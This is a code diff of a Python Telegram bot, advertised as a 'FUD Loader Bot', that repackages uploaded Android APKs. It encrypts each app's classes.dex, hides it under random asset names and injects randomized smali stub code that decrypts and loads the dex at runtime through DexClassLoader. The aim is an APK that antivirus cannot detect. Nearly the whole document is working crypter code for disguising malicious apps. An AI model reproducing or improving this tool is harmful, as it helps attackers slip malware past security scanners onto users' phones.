@@ -35,63 +35,112 @@ def run_cmd(cmd, timeout=300):
 def random_string(length=8):
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
-# --------------- Smali Strings (NO BACKSLASH) ---------------
-STUB_APP = """.class public Ldropper/StubApp;
+def generate_stub(package_name: str, main_activity: str, app_class: str = ""):
+    """
+    Generates randomized smali code for the loader.
+    Returns (app_smali, util_smali) strings.
+    """
+    # Random stub package & classes
+    pkg = "com." + random_string(6) + "." + random_string(6)
+    app_cls = random_string(3).capitalize()  # e.g., 'Aab'
+    util_cls = random_string(3).capitalize()
+    key_asset = random_string(8) + ".txt"
+    dex_asset = random_string(8) + ".dex"
+
+    # StubApp.smali
+    app_smali = f""".class public L{pkg}/{app_cls};
 .super Landroid/app/Application;
 
 .method public onCreate()V
     .registers 8
     .prologue
     :try_start
-    invoke-virtual {p0}, Ldropper/StubApp;->getApplicationContext()Landroid/content/Context;
+    invoke-virtual {{p0}}, L{pkg}/{app_cls};->getApplicationContext()Landroid/content/Context;
     move-result-object v0
 
-    const-string v1, "key.txt"
-    invoke-virtual {p0}, Ldropper/StubApp;->getAssets()Landroid/content/res/AssetManager;
+    const-string v1, "{key_asset}"
+    invoke-virtual {{p0}}, L{pkg}/{app_cls};->getAssets()Landroid/content/res/AssetManager;
     move-result-object v2
-    invoke-virtual {v2, v1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
+    invoke-virtual {{v2, v1}}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
     move-result-object v1
-    invoke-static {v1}, Ldropper/Util;->readBytes(Ljava/io/InputStream;)[B
+    invoke-static {{v1}}, L{pkg}/{util_cls};->readBytes(Ljava/io/InputStream;)[B
     move-result-object v1
     new-instance v2, Ljava/lang/String;
-    invoke-direct {v2, v1}, Ljava/lang/String;-><init>([B)V
-    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;
+    invoke-direct {{v2, v1}}, Ljava/lang/String;-><init>([B)V
+    invoke-virtual {{v2}}, Ljava/lang/String;->trim()Ljava/lang/String;
     move-result-object v2
-    invoke-static {v2}, Ldropper/Util;->hexToBytes(Ljava/lang/String;)[B
+    invoke-static {{v2}}, L{pkg}/{util_cls};->hexToBytes(Ljava/lang/String;)[B
     move-result-object v3
 
-    const-string v4, "payload.enc"
-    invoke-virtual {p0}, Ldropper/StubApp;->getAssets()Landroid/content/res/AssetManager;
+    const-string v4, "{dex_asset}"
+    invoke-virtual {{p0}}, L{pkg}/{app_cls};->getAssets()Landroid/content/res/AssetManager;
     move-result-object v5
-    invoke-virtual {v5, v4}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
+    invoke-virtual {{v5, v4}}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
     move-result-object v4
-    invoke-static {v4}, Ldropper/Util;->readBytes(Ljava/io/InputStream;)[B
+    invoke-static {{v4}}, L{pkg}/{util_cls};->readBytes(Ljava/io/InputStream;)[B
     move-result-object v4
 
     const-string v5, "AES/ECB/PKCS5Padding"
-    invoke-static {v5}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;
+    invoke-static {{v5}}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;
     move-result-object v5
     new-instance v6, Ljavax/crypto/spec/SecretKeySpec;
     const-string v7, "AES"
-    invoke-direct {v6, v3, v7}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V
+    invoke-direct {{v6, v3, v7}}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V
     const/4 v7, 0x2
-    invoke-virtual {v5, v7, v6}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V
-    invoke-virtual {v5, v4}, Ljavax/crypto/Cipher;->doFinal([B)[B
+    invoke-virtual {{v5, v7, v6}}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V
+    invoke-virtual {{v5, v4}}, Ljavax/crypto/Cipher;->doFinal([B)[B
     move-result-object v4
 
-    const-string v6, "dropped.apk"
+    const-string v6, "classes.opt"
     const/4 v7, 0x0
-    invoke-virtual {p0, v6, v7}, Ldropper/StubApp;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;
+    invoke-virtual {{p0, v6, v7}}, L{pkg}/{app_cls};->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;
     move-result-object v6
-    invoke-virtual {v6, v4}, Ljava/io/FileOutputStream;->write([B)V
-    invoke-virtual {v6}, Ljava/io/FileOutputStream;->close()V
+    invoke-virtual {{v6, v4}}, Ljava/io/FileOutputStream;->write([B)V
+    invoke-virtual {{v6}}, Ljava/io/FileOutputStream;->close()V
 
-    new-instance v6, Ljava/io/File;
-    invoke-virtual {p0}, Ldropper/StubApp;->getFilesDir()Ljava/io/File;
+    new-instance v6, Ldalvik/system/DexClassLoader;
+    invoke-virtual {{p0}}, L{pkg}/{app_cls};->getFilesDir()Ljava/io/File;
     move-result-object v7
-    const-string v8, "dropped.apk"
-    invoke-direct {v6, v7, v8}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
-    invoke-static {v0, v6}, Ldropper/Util;->installApk(Landroid/content/Context;Ljava/io/File;)V
+    invoke-virtual {{v7}}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
+    move-result-object v7
+    const-string v8, "classes.opt"
+    invoke-virtual {{p0, v8, v7}}, L{pkg}/{app_cls};->getDir(Ljava/lang/String;I)Ljava/io/File;
+    move-result-object v8
+    invoke-virtual {{v8}}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
+    move-result-object v8
+    const/4 v9, 0x0
+    invoke-virtual {{p0}}, L{pkg}/{app_cls};->getClassLoader()Ljava/lang/ClassLoader;
+    move-result-object v10
+    invoke-direct/range {{v6 .. v10}}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V
+"""
+    # If app_class is provided (original application class), we load and call it
+    if app_class:
+        app_smali += f"""
+    const-string v7, "{app_class}"
+    invoke-virtual {{v6, v7}}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;
+    move-result-object v7
+    invoke-virtual {{v7}}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;
+    move-result-object v7
+    check-cast v7, Landroid/app/Application;
+    const-class v8, Landroid/app/Application;
+    const-string v9, "mBase"
+    invoke-virtual {{v8, v9}}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
+    move-result-object v8
+    const/4 v9, 0x1
+    invoke-virtual {{v8, v9}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
+    invoke-virtual {{p0}}, L{pkg}/{app_cls};->getBaseContext()Landroid/content/Context;
+    move-result-object v9
+    invoke-virtual {{v8, v7, v9}}, Ljava/lang/reflect/Field;->set(Ljava/lang/Object;Ljava/lang/Object;)V
+    invoke-virtual {{v7}}, Landroid/app/Application;->onCreate()V
+"""
+    else:
+        # No Application class, start launcher activity
+        app_smali += f"""
+    const-string v7, "{package_name}"
+    const-string v8, "{main_activity}"
+    invoke-static {{p0, v7, v8}}, L{pkg}/{util_cls};->startMainActivity(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
+"""
+    app_smali += """
     :try_end
     .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch_0
     return-void
@@ -101,33 +150,33 @@ STUB_APP = """.class public Ldropper/StubApp;
     return-void
 .end method
 """
-
-STUB_UTIL = """.class public Ldropper/Util;
+    # Util.smali
+    util_smali = f""".class public L{pkg}/{util_cls};
 .super Ljava/lang/Object;
 
 .method public static readBytes(Ljava/io/InputStream;)[B
     .registers 4
     new-instance v0, Ljava/io/ByteArrayOutputStream;
-    invoke-direct {v0}, Ljava/io/ByteArrayOutputStream;-><init>()V
+    invoke-direct {{v0}}, Ljava/io/ByteArrayOutputStream;-><init>()V
     const/16 v1, 0x400
     new-array v1, v1, [B
     :loop
-    invoke-virtual {p0, v1}, Ljava/io/InputStream;->read([B)I
+    invoke-virtual {{p0, v1}}, Ljava/io/InputStream;->read([B)I
     move-result v2
     const/4 v3, -0x1
     if-eq v2, v3, :write
     const/4 v3, 0x0
-    invoke-virtual {v0, v1, v3, v2}, Ljava/io/ByteArrayOutputStream;->write([BII)V
+    invoke-virtual {{v0, v1, v3, v2}}, Ljava/io/ByteArrayOutputStream;->write([BII)V
     goto :loop
     :write
-    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B
+    invoke-virtual {{v0}}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B
     move-result-object v0
     return-object v0
 .end method
 
 .method public static hexToBytes(Ljava/lang/String;)[B
     .registers 7
-    invoke-virtual {p0}, Ljava/lang/String;->length()I
+    invoke-virtual {{p0}}, Ljava/lang/String;->length()I
     move-result v0
     div-int/lit8 v0, v0, 0x2
     new-array v1, v0, [B
@@ -136,10 +185,10 @@ STUB_UTIL = """.class public Ldropper/Util;
     if-ge v2, v0, :endloop
     mul-int/lit8 v3, v2, 0x2
     add-int/lit8 v4, v3, 0x2
-    invoke-virtual {p0, v3, v4}, Ljava/lang/String;->substring(II)Ljava/lang/String;
+    invoke-virtual {{p0, v3, v4}}, Ljava/lang/String;->substring(II)Ljava/lang/String;
     move-result-object v3
     const/16 v4, 0x10
-    invoke-static {v3, v4}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;I)I
+    invoke-static {{v3, v4}}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;I)I
     move-result v3
     int-to-byte v3, v3
     aput-byte v3, v1, v2
@@ -149,38 +198,21 @@ STUB_UTIL = """.class public Ldropper/Util;
     return-object v1
 .end method
 
-.method public static installApk(Landroid/content/Context;Ljava/io/File;)V
-    .registers 7
-    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
-    const/16 v1, 0x18
-    if-lt v0, v1, :nougat
-    const-string v2, "__PACKAGE__.fileprovider"
-    invoke-static {p0, v2, p1}, Ldropper/Util;->getUriForFile(Landroid/content/Context;Ljava/lang/String;Ljava/io/File;)Landroid/net/Uri;
-    move-result-object v2
-    goto :pre_nougat
-    :nougat
-    invoke-static {p1}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;
-    move-result-object v2
-    :pre_nougat
-    new-instance v3, Landroid/content/Intent;
-    const-string v4, "android.intent.action.VIEW"
-    invoke-direct {v3, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
-    invoke-virtual {v3, v2}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;
-    const-string v4, "application/vnd.android.package-archive"
-    invoke-virtual {v3, v4}, Landroid/content/Intent;->setType(Ljava/lang/String;)Landroid/content/Intent;
-    const/high16 v4, 0x10000000
-    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
-    invoke-virtual {p0, v3}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
+.method public static startMainActivity(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
+    .registers 6
+    new-instance v0, Landroid/content/Intent;
+    const-string v1, "android.intent.action.MAIN"
+    invoke-direct {{v0, v1}}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
+    new-instance v1, Landroid/content/ComponentName;
+    invoke-direct {{v1, p1, p2}}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V
+    invoke-virtual {{v0, v1}}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;
+    const/high16 v1, 0x10000000
+    invoke-virtual {{v0, v1}}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
+    invoke-virtual {{p0, v0}}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
     return-void
 .end method
-
-.method private static getUriForFile(Landroid/content/Context;Ljava/lang/String;Ljava/io/File;)Landroid/net/Uri;
-    .registers 3
-    invoke-static {p0, p1, p2}, Landroidx/core/content/FileProvider;->getUriForFile(Landroid/content/Context;Ljava/lang/String;Ljava/io/File;)Landroid/net/Uri;
-    move-result-object v0
-    return-object v0
-.end method
 """
+    return app_smali, util_smali, key_asset, dex_asset, pkg, app_cls
 
 def dropper_protect(input_apk: str, output_apk: str) -> bool:
     ensure_dirs()
@@ -195,70 +227,92 @@ def dropper_protect(input_apk: str, output_apk: str) -> bool:
 
     try:
         manifest_path = os.path.join(dec_dir, 'AndroidManifest.xml')
-        import xml.etree.ElementTree as ET
-        tree = ET.parse(manifest_path)
-        root = tree.getroot()
-        package_name = root.attrib['package']
+        # Parse original manifest for package, main activity, application class
+        with open(manifest_path, 'r', encoding='utf-8') as f:
+            manifest = f.read()
+        package_name = re.search(r'package="([^"]+)"', manifest).group(1)
 
-        key = os.urandom(16)
-        key_hex = base64.b16encode(key).decode().lower()
-        if not run_cmd(['openssl', 'enc', '-aes-128-ecb', '-K', key_hex, '-in', input_apk, '-out', encrypted_apk], timeout=60):
+        # Find main activity
+        main_activity = None
+        app_class = None
+        # Get application class if any
+        app_match = re.search(r'<application[^>]*android:name="([^"]*)"', manifest)
+        if app_match:
+            app_class = app_match.group(1)
+            if app_class.startswith('.'):
+                app_class = package_name + app_class
+        # Find launcher activity
+        # Simple search for action MAIN / category LAUNCHER
+        launcher_re = re.search(r'<activity[^>]*>.*?<action android:name="android\.intent\.action\.MAIN".*?>.*?</activity>', manifest, re.DOTALL)
+        if launcher_re:
+            activity_block = launcher_re.group(0)
+            act_name = re.search(r'android:name="([^"]+)"', activity_block)
+            if act_name:
+                main_activity = act_name.group(1)
+                if main_activity.startswith('.'):
+                    main_activity = package_name + main_activity
+        if not main_activity:
+            # Fallback: first activity
+            act_search = re.search(r'<activity[^>]*android:name="([^"]+)"', manifest)
+            if act_search:
+                main_activity = act_search.group(1)
+                if main_activity.startswith('.'):
+                    main_activity = package_name + main_activity
+        if not main_activity:
+            logger.error("Cannot determine main activity")
             return False
 
+        # Encrypt original classes.dex only (not whole APK) for faster operation
+        # Extract classes.dex from original APK
+        import zipfile, io
+        with zipfile.ZipFile(input_apk, 'r') as zf:
+            dex_data = zf.read('classes.dex')
+        key = os.urandom(16)
+        key_hex = base64.b16encode(key).decode().lower()
+        # Encrypt dex file
+        enc_dex = os.path.join(TEMP_DIR, 'enc_dex.bin')
+        with open(enc_dex, 'wb') as f:
+            f.write(dex_data)
+        # Use openssl
+        if not run_cmd(['openssl', 'enc', '-aes-128-ecb', '-K', key_hex, '-in', enc_dex, '-out', encrypted_apk], timeout=60):
+            return False
+        # Now encrypted_apk is actually encrypted dex
+
+        # Generate stub smali
+        stub_app, stub_util, key_asset, dex_asset, stub_pkg, app_cls = generate_stub(
+            package_name, main_activity, app_class if app_class else ""
+        )
+
+        # Assets
         assets_dir = os.path.join(dec_dir, 'assets')
         os.makedirs(assets_dir, exist_ok=True)
-        shutil.copy(encrypted_apk, os.path.join(assets_dir, 'payload.enc'))
-        with open(os.path.join(assets_dir, 'key.txt'), 'w') as f:
+        shutil.copy(encrypted_apk, os.path.join(assets_dir, dex_asset))
+        with open(os.path.join(assets_dir, key_asset), 'w') as f:
             f.write(key_hex)
 
+        # Remove original smali
         for item in os.listdir(dec_dir):
             if item.startswith('smali'):
                 shutil.rmtree(os.path.join(dec_dir, item), ignore_errors=True)
 
-        stub_dir = os.path.join(dec_dir, 'smali', 'dropper')
+        # Create new smali with stub package
+        stub_dir = os.path.join(dec_dir, 'smali', *stub_pkg.split('.')[1:])  # com.a.b -> a/b
         os.makedirs(stub_dir, exist_ok=True)
+        with open(os.path.join(stub_dir, app_cls + '.smali'), 'w') as f:
+            f.write(stub_app)
+        with open(os.path.join(stub_dir, 'Util.smali'), 'w') as f:  # We'll keep Util name as it's called from StubApp, but it's inside random package so fine
+            f.write(stub_util)
 
-        with open(os.path.join(stub_dir, 'StubApp.smali'), 'w') as f:
-            f.write(STUB_APP)
-        with open(os.path.join(stub_dir, 'Util.smali'), 'w') as f:
-            f.write(STUB_UTIL.replace('__PACKAGE__', package_name))
-
-        # Fix manifest: replace or add android:name without duplicate
+        # Modify manifest: set Application class to stub
         with open(manifest_path, 'r', encoding='utf-8') as f:
             manifest = f.read()
-
-        # Check if <application> already has android:name
-        if 'android:name=' in manifest.split('<application')[1].split('>')[0]:
-            # Replace existing attribute
-            manifest = re.sub(
-                r'(<application[^>]*?)android:name="[^"]*"',
-                r'\1android:name="dropper.StubApp"',
-                manifest
-            )
-        else:
-            # Add new attribute
-            manifest = manifest.replace('<application', '<application android:name="dropper.StubApp"')
-
-        # Add FileProvider
-        provider_entry = '''
-        <provider
-            android:name="androidx.core.content.FileProvider"
-            android:authorities="''' + package_name + '''.fileprovider"
-            android:exported="false"
-            android:grantUriPermissions="true">
-            <meta-data
-                android:name="android.support.FILE_PROVIDER_PATHS"
-                android:resource="@xml/file_paths" />
-        </provider>'''
-        manifest = manifest.replace('</application>', provider_entry + '\n    </application>')
+        # Remove any existing android:name from application
+        manifest = re.sub(r'(<application[^>]*?)android:name="[^"]*"', r'\1', manifest)
+        # Add our stub
+        manifest = manifest.replace('<application', f'<application android:name="{stub_pkg}.{app_cls}"')
+        # No FileProvider needed now
         with open(manifest_path, 'w', encoding='utf-8') as f:
             f.write(manifest)
-
-        # Create file_paths.xml
-        xml_dir = os.path.join(dec_dir, 'res', 'xml')
-        os.makedirs(xml_dir, exist_ok=True)
-        with open(os.path.join(xml_dir, 'file_paths.xml'), 'w') as f:
-            f.write('<?xml version="1.0" encoding="utf-8"?>\n<paths>\n    <files-path name="internal" path="." />\n</paths>')
 
         if not run_cmd(['apktool', 'b', '-o', rebuilt, dec_dir], timeout=180):
             return False
@@ -283,11 +337,12 @@ def dropper_protect(input_apk: str, output_apk: str) -> bool:
             try: os.remove(f)
             except: pass
 
+# Telegram handlers (same as before)
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_allowed(update.effective_user.id):
         await update.message.reply_text("Access denied.")
         return
-    await update.message.reply_text("FUD Dropper Bot ready. Send APK.")
+    await update.message.reply_text("FUD Loader Bot ready. Send APK.")
 
 async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
@@ -315,7 +370,7 @@ async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_document(
                 document=f,
                 filename=os.path.basename(fout),
-                caption="FUD APK ready (Dropper)."
+                caption="FUD Loader APK ready."
             )
         try: os.remove(fout)
         except: pass
